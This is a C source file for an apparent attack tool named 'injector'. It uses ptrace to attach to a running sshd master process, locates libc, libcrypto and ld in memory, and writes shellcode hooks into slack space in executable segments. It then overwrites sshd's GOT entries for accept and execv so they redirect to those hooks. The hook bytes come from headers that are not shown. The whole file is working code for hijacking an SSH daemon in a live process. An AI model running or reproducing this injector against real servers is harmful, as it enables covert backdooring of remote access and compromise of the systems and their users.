#include "func_offset.h"
#include "got_offset.h"
#include "log.h"
#include "proc_map.h"
#include "seg_gap.h"
#include "sshd_accept_hook.h"
#include "sshd_execv_hook.h"
#include "trace_utils.h"
// clang-format off
#include <iso646.h>
#include <keystone/keystone.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <linux/ptrace.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <fcntl.h>
// clang-format on

uint64_t sshd_base;
uint64_t libc_base;
uint64_t libcrypto_base;
uint64_t ld_base;

char *sshd_path = "/usr/bin/sshd";
char *libc_path = "/usr/lib/libc.so.6";
char *libcrypto_path = "/usr/lib/libcrypto.so.3";
char *ld_path = "/usr/lib/ld-linux-x86-64.so.2";

#define ACCEPT_HOOK_OFFSET 0x0
#define EXECV_HOOK_OFFSET 0x205

#define CALL_EXECV "\x48\xB8\xF0\xDE\xBC\x9A\x78\x56\x34\x12\xFF\xD0"
#define GET_RW "\x48\xB8\xEF\xCD\xAB\x89\x67\x45\x23\x01"

void
usage ()
{
  puts ("usage: injector sshd-master-pid [ sshd-path libc_path libcrypto-path "
        "ld_path ]");
  puts ("use /proc/sshd-master-pid/maps paths");
  printf ("sshd_path default as %s\n", sshd_path);
  printf ("libc_path default as %s\n", libc_path);
  printf ("libcrypto_path default as %s\n", libcrypto_path);
  printf ("ld_path default as %s\n", ld_path);
  exit (0);
}

// replace the place_holder to the bytes I need
void
preprocess_code ()
{
  char *call_execv = CALL_EXECV;

  uint64_t execv = get_func_offset ("execv", libc_path);
  execv += libc_base;
  call_execv = memmem (sshd_execv, sizeof (sshd_execv), call_execv, 0xc);
  memcpy (&call_execv[2], &execv, 8);

  char *get_rw = GET_RW;
  uint64_t sshd_rw_start = sshd_base + get_seg_gap (sshd_path, 6);

  get_rw = memmem (sshd_accept, sizeof (sshd_accept), get_rw, 0xa);
  memcpy (&get_rw[2], &sshd_rw_start, 0x8);

  get_rw = GET_RW;
  get_rw = memmem (sshd_execv, sizeof (sshd_execv), get_rw, 0xa);
  memcpy (&get_rw[2], &sshd_rw_start, 0x8);
}

uint64_t
where_to_inject ()
{
  uint64_t code_size = sizeof (sshd_accept) + sizeof (sshd_execv);
  printf ("the code size is 0x%lx\n", code_size);

  uint64_t sshd_rx_start = sshd_base + get_seg_gap (sshd_path, 5);
  uint64_t sshd_rx_gap = 0x1000 - (sshd_rx_start % 0x1000);
  printf ("sshd_rx_gap: 0x%lx\n", sshd_rx_gap);

  uint64_t libc_rx_start = libc_base + get_seg_gap (libc_path, 5);
  uint64_t libc_rx_gap = 0x1000 - (libc_rx_start % 0x1000);
  printf ("libc_rx_gap: 0x%lx\n", libc_rx_gap);

  uint64_t libcrypto_rx_start
      = libcrypto_base + get_seg_gap (libcrypto_path, 5);
  uint64_t libcrypto_rx_gap = 0x1000 - (libcrypto_rx_start % 0x1000);
  printf ("libcrypto_rx_gap: 0x%lx\n", libcrypto_rx_gap);

  uint64_t ld_rx_start = ld_base + get_seg_gap (ld_path, 5);
  uint64_t ld_rx_gap = 0x1000 - (ld_rx_start % 0x1000);
  printf ("ld_rx_gap: 0x%lx\n", ld_rx_gap);

  if (code_size < sshd_rx_gap)
    {
      printf ("[INFO]: injecting to sshd_rx_gap\n");
      return sshd_rx_start;
    }
  if (code_size < libc_rx_gap)
    {
      printf ("[INFO]: injecting to libc_rx_gap\n");
      return libc_rx_start;
    }
  if (code_size < libcrypto_rx_gap)
    {
      printf ("[INFO]: injecting to libcrypto_rx_gap\n");
      return libcrypto_rx_start;
    }
  if (code_size < ld_rx_gap)
    {
      printf ("[INFO]: injecting to ld_rx_gap\n");
      return ld_rx_start;
    }
  PEXIT ("[ERROR]: no enough rx to inject the code");
}

int
main (int argc, char **argv)
{
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  if (argc < 2)
    usage ();
  uint32_t pid = strtol (argv[1], NULL, 0);

  if (argc > 2)
    sshd_path = argv[2];
  if (argc > 3)
    libc_path = argv[3];
  if (argc > 4)
    libcrypto_path = argv[4];
  if (argc > 5)
    ld_path = argv[5];

  attach (pid);
  sshd_base = parse_maps (pid, "", sshd_path);
  libc_base = parse_maps (pid, "", libc_path);
  libcrypto_base = parse_maps (pid, "", libcrypto_path);
  ld_base = parse_maps (pid, "", ld_path);
  preprocess_code ();

  uint64_t accept_got = sshd_base + get_got_offset (sshd_path, "accept");
  uint64_t execv_got = sshd_base + get_got_offset (sshd_path, "execv");

  uint64_t inject_start = where_to_inject ();

  uint64_t accept_hook_start = inject_start;
  copy_to_tracee (pid, accept_hook_start, sshd_accept, sizeof (sshd_accept));
  accept_hook_start += ACCEPT_HOOK_OFFSET;
  copy_to_tracee (pid, accept_got, (uint8_t *)&accept_hook_start, 0x8);

  uint64_t execv_hook_start
      = ((inject_start + sizeof (sshd_accept)) & ~0x7) + 0x8;
  copy_to_tracee (pid, execv_hook_start, sshd_execv, sizeof (sshd_execv));
  execv_hook_start += EXECV_HOOK_OFFSET;
  copy_to_tracee (pid, execv_got, (uint8_t *)&execv_hook_start, 0x8);

  detach (pid);
}
